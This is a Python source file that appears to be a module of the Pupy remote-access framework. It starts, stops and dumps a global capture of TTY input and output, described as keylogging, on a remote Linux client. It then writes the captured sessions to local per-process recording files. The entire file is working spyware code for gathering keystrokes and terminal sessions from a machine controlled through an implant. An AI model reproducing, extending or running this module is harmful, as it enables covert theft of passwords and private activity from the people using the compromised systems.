# -*- coding: utf-8 -*-

import os
import zlib
import struct

from StringIO import StringIO

from pupylib.PupyModule import PupyModule, PupyArgumentParser
from pupylib.PupyModule import config

KEYLOGGER_EVENT = 0x14000001

__class_name__ = 'TTYRec'

@config(cat='gather', compat=['linux'])
class TTYRec(PupyModule):
    ''' Globally capture intput/output to TTY. Compatible with kernels
        which have KProbes tracing. Right now backed module tested/works only on AMD64.
        You can (try to) use ttyplay to play dump. Note that fullscreen apps likely will
        be corrupted. '''

    unique_instance = True

    dependencies = {
        'linux': ['ttyrec']
    }

    header = struct.Struct('<16ssIIII')

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='ttyrec', description=cls.__doc__)
        commands = cls.arg_parser.add_subparsers(help='commands')
        start = commands.add_parser('start', help='Start TTYRec')
        start.set_defaults(func=cls.start)

        dump = commands.add_parser('dump', help='Dump TTYRec results')
        dump.set_defaults(func=cls.dump)

        stop = commands.add_parser('stop', help='Stop TTYRec')
        stop.set_defaults(func=cls.stop)

    def start(self, args):
        start = self.client.remote('ttyrec', 'start', False)

        if start(event_id=KEYLOGGER_EVENT):
            self.success('TTYRec started')

    def stop(self, args):
        self.dump(args)
        stop = self.client.remote('ttyrec', 'stop', False)
        if stop():
            self.success('TTYRec stopped')

    def dump(self, args):
        dump = self.client.remote('ttyrec', 'dump', False)
        data = dump()

        if not data:
            return

        dumpdir = self.config.get_folder('records', {'%c': self.client.short_name()})
        dests = {}

        data = StringIO(zlib.decompress(data))
        while True:
            header = data.read(self.header.size)
            if not header:
                break

            comm, probe, pid, sec, usec, lbuf = self.header.unpack(header)
            comm = comm.strip('\0')
            pid = int(pid)
            sec = int(sec)
            usec = int(usec)
            lbuf = int(lbuf)
            key = frozenset([comm, probe, pid])
            if key not in dests:
                filename = '{}.{}.{}.rec'.format(comm, pid, probe)
                dest = os.path.join(dumpdir, filename)
                self.info('{} {} -> {}'.format(comm, pid, dest))
                dests[key] = open(dest, 'a')

            payload = data.read(lbuf)
            dests[key].write(struct.pack('<III', sec, usec, lbuf))
            dests[key].write(payload)

        for f in dests.itervalues():
            f.close()

    def run(self, args):
        args.func(self, args)
